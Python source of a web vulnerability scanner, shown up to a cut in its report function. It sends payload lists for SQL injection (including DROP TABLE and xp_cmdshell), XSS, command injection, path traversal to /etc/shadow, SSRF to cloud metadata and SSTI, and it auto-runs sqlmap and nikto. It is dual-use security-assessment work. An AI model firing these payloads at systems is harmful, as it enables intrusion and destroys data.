#!/usr/bin/env python3
# =============================================================================
#   ADVANCE AI WEB VULNERABILITY SCANNER
#   Author  : ABHAY SAHU
#   Purpose : Authorized Web Application Security Assessment Tool
#   Platform: Kali Linux
#   WARNING : Use ONLY on systems you own or have EXPLICIT written permission
# =============================================================================

import subprocess
import sys
import os
import importlib

# ─────────────────────────── AUTO-INSTALLER ───────────────────────────────
# Each entry: (import_name, pip_package_name, apt_package_name_or_None)
# import_name  → what Python uses in `import X`
# pip_package  → what pip knows it as
# apt_package  → system-level fallback (preferred on Kali / PEP-668 systems)

PYTHON_DEPS = [
    # (import_name,    pip_name,         apt_name)
    ("requests",       "requests",        "python3-requests"),
    ("bs4",            "beautifulsoup4",  "python3-bs4"),
    ("urllib3",        "urllib3",         "python3-urllib3"),
    ("colorama",       "colorama",        "python3-colorama"),
    ("rich",           "rich",            "python3-rich"),
    ("dns",            "dnspython",       "python3-dnspython"),
    ("tqdm",           "tqdm",            "python3-tqdm"),
    ("lxml",           "lxml",            "python3-lxml"),
    ("prettytable",    "prettytable",     "python3-prettytable"),
    ("pyfiglet",       "pyfiglet",        "python3-pyfiglet"),
]

# System binary tools: binary_name → apt package
SYSTEM_TOOLS = {
    "nmap":    "nmap",
    "sqlmap":  "sqlmap",
    "nikto":   "nikto",
    "wafw00f": "wafw00f",
    "whatweb": "whatweb",
}

def _cmd_exists(cmd):
    return subprocess.call(["which", cmd],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL) == 0

def _apt_install(apt_pkg):
    """Install a package via apt (requires root / sudo — normal on Kali)."""
    print(f"  [apt] Installing {apt_pkg} …")
    ret = subprocess.call(
        ["sudo", "apt-get", "install", "-y", "-q", apt_pkg],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    return ret == 0

def _pip_install(pip_pkg):
    """
    Install via pip with --break-system-packages so it works on
    PEP-668 / Kali-Linux / Ubuntu 23+ systems (Python 3.11+).
    Falls back to --user if the first attempt still fails.
    """
    for extra in [["--break-system-packages"], ["--user"]]:
        ret = subprocess.call(
            [sys.executable, "-m", "pip", "install", pip_pkg, "-q"] + extra,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        if ret == 0:
            return True
    return False

def ensure_python_deps():
    for import_name, pip_name, apt_name in PYTHON_DEPS:
        try:
            importlib.import_module(import_name)
            continue                        # already available
        except ImportError:
            pass

        print(f"  [~] Missing: {import_name}  →  trying apt ({apt_name}) …")
        # 1) Try apt first (cleanest on Kali, no PEP-668 issues)
        if apt_name and _apt_install(apt_name):
            try:
                importlib.import_module(import_name)
                print(f"  [✓] {import_name} installed via apt")
                continue
            except ImportError:
                pass  # apt succeeded but module still missing; fall through to pip

        # 2) Fall back to pip + --break-system-packages
        print(f"  [~] apt failed or unavailable, trying pip ({pip_name}) …")
        if _pip_install(pip_name):
            try:
                importlib.import_module(import_name)
                print(f"  [✓] {import_name} installed via pip")
                continue
            except ImportError:
                pass

        print(f"  [!] WARNING: Could not install {import_name} — "
              f"run manually:  sudo apt install {apt_name}  or  "
              f"pip install {pip_name} --break-system-packages")

def ensure_system_tools():
    for binary, apt_pkg in SYSTEM_TOOLS.items():
        if _cmd_exists(binary):
            continue
        print(f"  [~] Missing tool: {binary}  →  installing {apt_pkg} …")
        if _apt_install(apt_pkg):
            print(f"  [✓] {binary} installed")
        else:
            print(f"  [!] WARNING: Could not install {binary} — "
                  f"run:  sudo apt install {apt_pkg}")

def ensure_subfinder():
    if _cmd_exists("subfinder"):
        return
    # Try Go install if Go is present
    if _cmd_exists("go"):
        print("  [~] Installing subfinder via go …")
        subprocess.call(
            ["go", "install",
             "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

def auto_install():
    print("\n" + "="*60)
    print("  AUTO-INSTALLER  —  ADVANCE AI WEB VULNERABILITY SCANNER")
    print("="*60)
    print("[*] Checking Python dependencies …\n")
    ensure_python_deps()
    print("\n[*] Checking system tools …\n")
    ensure_system_tools()
    ensure_subfinder()
    print("\n[✓] Dependency check complete.\n" + "="*60 + "\n")

auto_install()

# ─────────────────────────── IMPORTS ──────────────────────────────────────

import requests
import socket
import re
import json
import time
import random
import threading
import dns.resolver
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.panel import Panel
from rich.text import Text
from rich import box
from tqdm import tqdm
from prettytable import PrettyTable
import pyfiglet
import urllib3
import warnings

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")
init(autoreset=True)
console = Console()

# ═══════════════════════════ BANNER ═══════════════════════════════════════

def print_banner():
    os.system("clear")
    banner = pyfiglet.figlet_format("ADVANCE AI\nWEB VULN\nSCANNER", font="slant")
    console.print(f"[bold cyan]{banner}[/bold cyan]")
    console.print(Panel.fit(
        "[bold yellow]  ╔══════════════════════════════════════════════╗\n"
        "  ║   ADVANCE AI WEB VULNERABILITY SCANNER       ║\n"
        "  ║   Author  : [bold green]MANASH KUMAR[/bold green][bold yellow]                     ║\n"
        "  ║   Platform: Kali Linux                       ║\n"
        "  ║   Purpose : Authorized Security Assessment   ║\n"
        "  ╚══════════════════════════════════════════════╝[/bold yellow]",
        border_style="bright_cyan"
    ))
    console.print("[bold red]  ⚠  WARNING: Use ONLY on systems you own or have explicit written permission to test.[/bold red]\n")

# ═══════════════════════════ CONFIG ═══════════════════════════════════════

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

MAX_CRAWL_DEPTH   = 3
MAX_THREADS       = 15
REQUEST_TIMEOUT   = 12
MAX_PAGES_CRAWL   = 250
FOUND_VULNS       = []
VISITED_URLS      = set()
ALL_PARAMS        = {}   # url -> [param_list]
SUBDOMAINS_FOUND  = []
LOCK              = threading.Lock()

# ═══════════════════════════ PAYLOAD ENGINE ════════════════════════════════

class PayloadEngine:
    """Self-generating adaptive payload engine."""

    # ── SQL Injection ──
    SQL_PAYLOADS = [
        "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "' OR 1=1#",
        "\" OR \"1\"=\"1", "') OR ('1'='1", "' OR 'x'='x",
        "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
        "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "1 AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
        "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "1; DROP TABLE users--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc)--",
        "' OR BENCHMARK(5000000,MD5('x'))--",
        "admin'--", "' OR 1=1 LIMIT 1--", "1' AND '1'='1",
        "'; EXEC xp_cmdshell('whoami')--",
        "' OR EXISTS(SELECT * FROM users)--",
        "%27%20OR%20%271%27%3D%271",    # URL-encoded
        "1 OR 1=1",
        "' HAVING 1=1--", "' GROUP BY 1--",
    ]

    # ── XSS ──
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(document.domain)>",
        "<svg onload=alert('XSS')>",
        "<svg/onload=alert`XSS`>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        "'-alert('XSS')-'",
        "\"-alert('XSS')-\"",
    ]

    # ── OWASP Top 10 Additional ──
    PATH_TRAVERSAL = [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    ]

    CMD_INJECTION = [
        "; ls -la", "| ls -la", "& ls -la", "`ls -la`",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "; id", "| id", "&& id",
        "; whoami", "| whoami",
        "$(whoami)", "${IFS}cat${IFS}/etc/passwd",
        "\n/bin/ls\n", ";%0als",
    ]

    SSRF_PAYLOADS = [
        "http://127.0.0.1/", "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://192.168.0.1/", "http://10.0.0.1/",
        "http://[::1]/", "http://0.0.0.0/",
        "http://127.0.0.1:22/", "http://127.0.0.1:3306/",
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/stat",
    ]

    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
    ]

    OPEN_REDIRECT = [
        "//evil.com", "//evil.com/", "https://evil.com",
        "//google.com", "javascript:alert(1)",
        "/\\evil.com", "/%09/evil.com",
    ]

    SSTI_PAYLOADS = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>",
        "{{config}}", "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}",
        "#{7*7}", "${{7*7}}", "${7*7}",
    ]

    LDAP_PAYLOADS = [
        "*)(uid=*))(|(uid=*", "*))(|(password=*",
        "admin)(&)", "x)(cn=*",
    ]

    @staticmethod
    def mutate_sql(base):
        mutations = []
        for enc in [base, base.replace("'", "%27"), base.replace(" ", "/**/"),
                    base.replace(" ", "+"), base.upper(), base.lower()]:
            mutations.append(enc)
        return mutations

    @staticmethod
    def generate_all():
        pe = PayloadEngine
        return {
            "SQL Injection":     pe.SQL_PAYLOADS,
            "XSS":               pe.XSS_PAYLOADS,
            "Path Traversal":    pe.PATH_TRAVERSAL,
            "Command Injection": pe.CMD_INJECTION,
            "SSRF":              pe.SSRF_PAYLOADS,
            "XXE":               pe.XXE_PAYLOADS,
            "Open Redirect":     pe.OPEN_REDIRECT,
            "SSTI":              pe.SSTI_PAYLOADS,
            "LDAP Injection":    pe.LDAP_PAYLOADS,
        }

# ═══════════════════════════ SEVERITY MAPPER ═══════════════════════════════

SEVERITY_MAP = {
    "SQL Injection":     "CRITICAL",
    "XSS":               "HIGH",
    "Path Traversal":    "HIGH",
    "Command Injection": "CRITICAL",
    "SSRF":              "HIGH",
    "XXE":               "HIGH",
    "Open Redirect":     "MEDIUM",
    "SSTI":              "CRITICAL",
    "LDAP Injection":    "HIGH",
    "Sensitive Header":  "MEDIUM",
    "CORS":              "MEDIUM",
    "Clickjacking":      "LOW",
    "CVE":               "CRITICAL",
}

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
SEVERITY_COLORS = {
    "CRITICAL": "bold red",
    "HIGH":     "bold orange3",
    "MEDIUM":   "bold yellow",
    "LOW":      "bold green",
}

# ═══════════════════════════ HELPER FUNCTIONS ══════════════════════════════

def normalize_url(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")

def get_domain(url):
    parsed = urllib.parse.urlparse(url)
    return parsed.netloc or parsed.path

def safe_get(url, timeout=REQUEST_TIMEOUT, allow_redirects=True, **kw):
    try:
        r = requests.get(url, headers=HEADERS, timeout=timeout,
                         verify=False, allow_redirects=allow_redirects, **kw)
        return r
    except Exception:
        return None

def safe_post(url, data, timeout=REQUEST_TIMEOUT, **kw):
    try:
        r = requests.post(url, data=data, headers=HEADERS,
                          timeout=timeout, verify=False, **kw)
        return r
    except Exception:
        return None

def add_finding(vuln_type, url, parameter, payload, evidence, severity=None):
    sev = severity or SEVERITY_MAP.get(vuln_type, "LOW")
    with LOCK:
        FOUND_VULNS.append({
            "type":      vuln_type,
            "url":       url,
            "parameter": parameter,
            "payload":   payload[:120],
            "evidence":  str(evidence)[:200],
            "severity":  sev,
        })

# ═══════════════════════════ CRAWLER ══════════════════════════════════════

class Crawler:
    def __init__(self, base_url, progress, task_id):
        self.base_url  = base_url
        self.domain    = get_domain(base_url)
        self.progress  = progress
        self.task_id   = task_id
        self.queue     = [base_url]
        self.forms     = []

    def extract_links(self, url, html):
        links = set()
        soup  = BeautifulSoup(html, "lxml")
        for tag in soup.find_all(["a", "link", "script", "img", "form"]):
            for attr in ["href", "src", "action"]:
                val = tag.get(attr)
                if not val:
                    continue
                full = urllib.parse.urljoin(url, val)
                parsed = urllib.parse.urlparse(full)
                if self.domain in parsed.netloc and full not in VISITED_URLS:
                    links.add(full)
        return links

    def extract_params(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if params:
            key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            with LOCK:
                ALL_PARAMS[key] = list(params.keys())

    def extract_forms(self, url, soup):
        for form in soup.find_all("form"):
            action  = urllib.parse.urljoin(url, form.get("action") or url)
            method  = (form.get("method") or "get").lower()
            inputs  = {}
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if name:
                    inputs[name] = inp.get("value") or "test"
            if inputs:
                with LOCK:
                    self.forms.append({"action": action, "method": method, "inputs": inputs})

    def crawl(self):
        depth = 0
        while self.queue and len(VISITED_URLS) < MAX_PAGES_CRAWL and depth < MAX_CRAWL_DEPTH:
            next_q = []
            for url in self.queue:
                if url in VISITED_URLS or len(VISITED_URLS) >= MAX_PAGES_CRAWL:
                    continue
                with LOCK:
                    VISITED_URLS.add(url)
                r = safe_get(url)
                if not r:
                    continue
                self.extract_params(url)
                if "text/html" in r.headers.get("content-type", ""):
                    soup  = BeautifulSoup(r.text, "lxml")
                    links = self.extract_links(url, r.text)
                    self.extract_forms(url, soup)
                    next_q.extend(links)
                self.progress.advance(self.task_id)
            self.queue = list(set(next_q) - VISITED_URLS)
            depth += 1
        return self.forms

# ═══════════════════════════ SUBDOMAIN FINDER ══════════════════════════════

class SubdomainFinder:
    WORDLIST = [
        "www","mail","ftp","admin","api","dev","staging","test","vpn","portal",
        "shop","store","blog","news","cdn","static","images","assets","media",
        "mobile","app","beta","alpha","secure","login","auth","account","dashboard",
        "panel","manage","cpanel","webmail","mx","smtp","imap","pop","dns","ns1",
        "ns2","backup","db","database","sql","mysql","redis","mongo","elastic",
        "jenkins","jira","gitlab","github","bitbucket","confluence","wiki","support",
        "help","docs","documentation","kb","community","forum","chat","irc",
        "internal","intranet","extranet","remote","vpn2","gateway","proxy","mx1",
        "mx2","mail2","email","newsletter","crm","erp","hr","finance","billing",
        "payment","checkout","cart","order","track","status","health","monitor",
        "stats","analytics","metrics","log","logs","debug","staging2","preprod",
        "prod","production","live","demo","sandbox","qa","uat","test2",
    ]

    def __init__(self, domain, progress, task_id):
        self.domain   = domain
        self.progress = progress
        self.task_id  = task_id

    def check_dns(self, sub):
        try:
            host = f"{sub}.{self.domain}"
            dns.resolver.resolve(host, "A")
            return host
        except Exception:
            return None

    def crtsh(self):
        found = set()
        try:
            r = requests.get(
                f"https://crt.sh/?q=%.{self.domain}&output=json",
                timeout=15, headers=HEADERS
            )
            if r.status_code == 200:
                for entry in r.json():
                    name = entry.get("name_value","")
                    for n in name.split("\n"):
                        n = n.strip().lstrip("*.")
                        if self.domain in n:
                            found.add(n)
        except Exception:
            pass
        return found

    def find_all(self):
        subs = set()
        # 1) crt.sh
        subs.update(self.crtsh())
        self.progress.advance(self.task_id, 20)

        # 2) DNS brute-force wordlist
        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = {ex.submit(self.check_dns, w): w for w in self.WORDLIST}
            done = 0
            total = len(self.WORDLIST)
            for fut in as_completed(futures):
                res = fut.result()
                if res:
                    subs.add(res)
                done += 1
                if done % 10 == 0:
                    self.progress.advance(self.task_id, 5)

        # 3) Try subfinder if installed
        try:
            result = subprocess.run(
                ["subfinder", "-d", self.domain, "-silent"],
                capture_output=True, text=True, timeout=30
            )
            for line in result.stdout.strip().splitlines():
                if line:
                    subs.add(line.strip())
        except Exception:
            pass

        global SUBDOMAINS_FOUND
        SUBDOMAINS_FOUND = list(subs)
        return list(subs)

# ═══════════════════════════ VULNERABILITY TESTERS ═════════════════════════

class VulnTester:

    # ── SQL Injection ──────────────────────────────────────────────────────
    SQL_ERRORS = [
        "sql syntax", "mysql_fetch", "pg_query", "sqlite_", "odbc_",
        "oracle error", "syntax error", "unclosed quotation",
        "mssql_", "microsoft sql", "division by zero",
        "warning: mysql", "you have an error in your sql",
        "supplied argument is not a valid mysql",
        "invalid query", "ora-", "db2 sql error",
    ]

    @staticmethod
    def test_sqli(url, param, baseline_len, progress, task):
        for pl in PayloadEngine.SQL_PAYLOADS:
            parsed = urllib.parse.urlparse(url)
            qs     = urllib.parse.parse_qs(parsed.query)
            qs[param] = [pl]
            new_q  = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_q))
            r = safe_get(test_url)
            progress.advance(task)
            if not r:
                continue
            body = r.text.lower()
            # Error-based
            for err in VulnTester.SQL_ERRORS:
                if err in body:
                    add_finding("SQL Injection", url, param, pl, f"Error: {err}", "CRITICAL")
                    return
            # Time-based blind – already included SLEEP/WAITFOR in payloads
            if "sleep" in pl.lower() or "waitfor" in pl.lower():
                pass  # Response-time comparison would require baseline; skip for speed
            # Length-based
            if abs(len(r.text) - baseline_len) > 500:
                add_finding("SQL Injection", url, param, pl, "Response length anomaly", "HIGH")
                return

    # ── XSS ───────────────────────────────────────────────────────────────
    @staticmethod
    def test_xss(url, param, forms, progress, task):
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        for pl in PayloadEngine.XSS_PAYLOADS:
            qs[param] = [pl]
            new_q     = urllib.parse.urlencode(qs, doseq=True)
            test_url  = urllib.parse.urlunparse(parsed._replace(query=new_q))
            r = safe_get(test_url)
            progress.advance(task)
            if r and pl.replace('"', "") in r.text:
                add_finding("XSS", url, param, pl, "Payload reflected in response", "HIGH")
                return
        # Form XSS
        for form in forms:
            if form["method"] == "post":
                for inp in form["inputs"]:
                    pl = "<script>alert('XSS')</script>"
                    data = dict(form["inputs"])
                    data[inp] = pl
                    r = safe_post(form["action"], data)
                    progress.advance(task)
                    if r and pl in r.text:
                        add_finding("XSS", form["action"], inp, pl,
                                    "Reflected XSS in form POST", "HIGH")
                        return

    # ── Path Traversal ────────────────────────────────────────────────────
    @staticmethod
    def test_path_traversal(url, param, progress, task):
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        for pl in PayloadEngine.PATH_TRAVERSAL:
            qs[param] = [pl]
            new_q    = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_q))
            r = safe_get(test_url)
            progress.advance(task)
            if r and ("root:x:" in r.text or "[fonts]" in r.text.lower()):
                add_finding("Path Traversal", url, param, pl,
                             "System file content in response", "HIGH")
                return

    # ── Command Injection ─────────────────────────────────────────────────
    @staticmethod
    def test_cmd_injection(url, param, progress, task):
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        for pl in PayloadEngine.CMD_INJECTION:
            qs[param] = [pl]
            new_q    = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_q))
            r = safe_get(test_url)
            progress.advance(task)
            if r and any(sig in r.text for sig in
                         ["uid=", "gid=", "root", "/bin/bash", "www-data"]):
                add_finding("Command Injection", url, param, pl,
                             "Shell output detected in response", "CRITICAL")
                return

    # ── SSRF ──────────────────────────────────────────────────────────────
    @staticmethod
    def test_ssrf(url, param, progress, task):
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        for pl in PayloadEngine.SSRF_PAYLOADS:
            qs[param] = [pl]
            new_q    = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_q))
            r = safe_get(test_url, timeout=5)
            progress.advance(task)
            if r and r.status_code == 200 and len(r.text) > 50:
                add_finding("SSRF", url, param, pl,
                             "Internal resource may be accessible", "HIGH")
                return

    # ── Open Redirect ─────────────────────────────────────────────────────
    @staticmethod
    def test_open_redirect(url, param, progress, task):
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        for pl in PayloadEngine.OPEN_REDIRECT:
            qs[param] = [pl]
            new_q    = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_q))
            r = safe_get(test_url, allow_redirects=False)
            progress.advance(task)
            if r and r.status_code in (301, 302, 303, 307, 308):
                loc = r.headers.get("Location","")
                if "evil.com" in loc or "google.com" in loc:
                    add_finding("Open Redirect", url, param, pl,
                                 f"Redirect to: {loc}", "MEDIUM")
                    return

    # ── SSTI ──────────────────────────────────────────────────────────────
    @staticmethod
    def test_ssti(url, param, progress, task):
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query)
        for pl in PayloadEngine.SSTI_PAYLOADS:
            qs[param] = [pl]
            new_q    = urllib.parse.urlencode(qs, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_q))
            r = safe_get(test_url)
            progress.advance(task)
            if r and "49" in r.text:    # 7*7 = 49
                add_finding("SSTI", url, param, pl,
                             "Template expression evaluated (7*7=49)", "CRITICAL")
                return

    # ── Security Headers ──────────────────────────────────────────────────
    @staticmethod
    def check_headers(url, progress, task):
        r = safe_get(url)
        progress.advance(task, 5)
        if not r:
            return
        hdrs = {k.lower(): v for k, v in r.headers.items()}

        missing = {
            "x-frame-options":          ("Clickjacking",    "LOW"),
            "x-content-type-options":   ("Sensitive Header","MEDIUM"),
            "content-security-policy":  ("Sensitive Header","MEDIUM"),
            "strict-transport-security":("Sensitive Header","MEDIUM"),
            "referrer-policy":          ("Sensitive Header","LOW"),
            "permissions-policy":       ("Sensitive Header","LOW"),
        }
        for h, (vtype, sev) in missing.items():
            if h not in hdrs:
                add_finding(vtype, url, f"Header: {h}",
                             "Missing", f"Security header '{h}' not set", sev)

        # CORS
        origin_hdr = {"Origin": "https://evil.com"}
        rc = safe_get(url, headers={**HEADERS, **origin_hdr})
        if rc:
            acao = rc.headers.get("Access-Control-Allow-Origin","")
            if acao in ("*", "https://evil.com"):
                add_finding("CORS", url, "CORS Policy", acao,
                             f"ACAO: {acao}", "MEDIUM")

    # ── CVE Intelligence (NVD API) ─────────────────────────────────────────
    @staticmethod
    def fetch_cves(tech_stack, progress, task):
        """Fetch latest critical CVEs from NIST NVD for detected technologies."""
        for tech in tech_stack[:5]:
            try:
                nvd_url = (
                    f"https://services.nvd.nist.gov/rest/json/cves/2.0"
                    f"?keywordSearch={urllib.parse.quote(tech)}"
                    f"&cvssV3Severity=CRITICAL&resultsPerPage=3"
                )
                r = requests.get(nvd_url, timeout=10)
                progress.advance(task, 5)
                if r.status_code == 200:
                    data = r.json()
                    for item in data.get("vulnerabilities", []):
                        cve  = item.get("cve",{})
                        cid  = cve.get("id","")
                        desc_list = cve.get("descriptions",[])
                        desc = next((d["value"] for d in desc_list
                                     if d["lang"]=="en"), "")[:150]
                        score = "N/A"
                        try:
                            score = cve["metrics"]["cvssMetricV31"][0]["cvssData"]["baseScore"]
                        except Exception:
                            pass
                        add_finding("CVE", "N/A (Global)", tech,
                                     cid, f"Score:{score} – {desc}", "CRITICAL")
            except Exception:
                pass

# ═══════════════════════════ TECH FINGERPRINT ══════════════════════════════

def fingerprint_tech(url):
    techs = []
    r = safe_get(url)
    if not r:
        return techs
    headers = {k.lower(): v.lower() for k, v in r.headers.items()}
    body    = r.text.lower()

    sigs = {
        "WordPress":   ["wp-content", "wp-includes", "wordpress"],
        "Joomla":      ["joomla", "/components/com_"],
        "Drupal":      ["drupal", "sites/default/files"],
        "Laravel":     ["laravel_session", "laravel"],
        "Django":      ["csrfmiddlewaretoken", "django"],
        "Rails":       ["_rails_", "x-runtime"],
        "PHP":         [".php", "php"],
        "ASP.NET":     ["asp.net", "__viewstate", "x-aspnet-version"],
        "jQuery":      ["jquery"],
        "Bootstrap":   ["bootstrap"],
        "React":       ["react", "__next"],
        "Angular":     ["angular", "ng-"],
        "Vue.js":      ["vue"],
        "Nginx":       ["nginx"],
        "Apache":      ["apache"],
        "IIS":         ["microsoft-iis"],
        "Cloudflare":  ["cf-ray", "cloudflare"],
    }
    for tech, patterns in sigs.items():
        for p in patterns:
            if p in body or any(p in v for v in headers.values()):
                if tech not in techs:
                    techs.append(tech)
                break
    # Server header
    server = headers.get("server","")
    if server and server not in techs:
        techs.append(server)
    return techs

# ═══════════════════════════ NIKTO / SQLMAP RUNNERS ═══════════════════════

def run_nikto(url, outfile="/tmp/nikto_out.txt"):
    if subprocess.call(["which","nikto"], stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL) == 0:
        subprocess.call(
            ["nikto", "-h", url, "-o", outfile, "-Format", "txt", "-Tuning", "123456789"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120
        )
        if os.path.exists(outfile):
            with open(outfile) as f:
                for line in f:
                    if "+ " in line and "OSVDB" in line:
                        add_finding("Sensitive Header", url, "Nikto",
                                     line.strip(), line.strip(), "MEDIUM")

def run_sqlmap(url):
    """Run sqlmap on URLs with parameters (silent, batch mode)."""
    if subprocess.call(["which","sqlmap"], stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL) != 0:
        return
    for target_url in list(ALL_PARAMS.keys())[:5]:
        subprocess.call(
            ["sqlmap", "-u", target_url, "--batch", "--level=2",
             "--risk=2", "--output-dir=/tmp/sqlmap_out", "-q"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=90
        )
        out_dir = f"/tmp/sqlmap_out/{urllib.parse.urlparse(target_url).netloc}"
        log_file = os.path.join(out_dir, "log")
        if os.path.exists(log_file):
            with open(log_file) as f:
                content = f.read()
            if "injectable" in content.lower() or "parameter" in content.lower():
                add_finding("SQL Injection", target_url, "sqlmap",
                             "auto-detected", "sqlmap confirmed injectable", "CRITICAL")

# ═══════════════════════════ REPORT GENERATOR ══════════════════════════════

def print_report(target, techs, subdomains, start_time):
    elapsed = time.time() - start_time
    sorted_vulns = sorted(FOUND_VULNS,
                           key=lambda x: SEVERITY_ORDER.get(x["severity"], 9))

    console.rule("[bold cyan]SCAN COMPLETE[/bold cyan]")
    console.print(f"\n[bold]Target:[/bold] {target}")
    console.print(f"[bold]Scan Duration:[/bold] {elapsed:.1f}s")
    console.print(f"[bold]Pages Crawled:[/bold] {len(VISITED_URLS)}")
    console.print(f"[bold]Parameters Found:[/bold] {sum(len(v) for v in ALL_PARAMS.values())}")
    console.print(f"[bold]Subdomains Found:[/bold] {len(subdomains)}")
    console.print(f"[bold]Technologies:[/bold] {', '.join(techs) or 'Unknown'}")
    console.print(f"[bold]Total Findings:[/bold] {len(sorted_vulns)}\n")

    # ── Subdomains table ──
    if subdomains:
        st = Table(title="Discovered Subdomains", box=box.ROUNDED,
                   border_style="cyan", header_style="bold cyan")
        st.add_column("#", style="dim", width=4)
        st.add_column("Subdomain", style="bold white")
        for i, sd in enumerate(sorted(subdomains), 1):
            st.add_row(str(i), sd)
        console.print(st)
        console.print()

    # ── Vulnerability table ──
    vt = Table(title="[bold red]Vulnerability Findings[/bold red]",
               box=box.DOUBLE_EDGE, border_style="red",
               header_style="bold white", show_lines=True)
    vt.add_column("#",         width=3,  style="dim")
    vt.add_column("Severity",  width=10)
    vt.add_column("Type",      width=20, style="bold")
    vt.add_column("URL",       width=40, overflow="fold")
    vt.add_column("Parameter", width=18, overflow="fold")
    vt.add_column("Payload",   width=30, overflow="fold")
    vt.add_column("Evidence",  width=40, overflow="fold")

    sev_cnt = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for i, v in enumerate(sorted_vulns, 1):
        sev = v["severity"]
        sev_cnt[sev] = sev_cnt.get(sev, 0) + 1
        color = SEVERITY_COLORS.get(sev, "white")
        vt.add_row(
            str(i),
            f"[{color}]{sev}[/{color}]",
            v["type"], v["url"], v["parameter"],
            v["payload"], v["evidence"]
        )

    if sorted_vulns:
        console.print(vt)
    else:
        console.print("[bold green]No vulnerabilities found. (Target may be well-hardened or requires deeper manual testing.)[/bold green]")

    # ── Summary bar ──
    console.print()
    console.print(Panel(
        f"[bold red]CRITICAL: {sev_cnt['CRITICAL']}[/bold red]  "
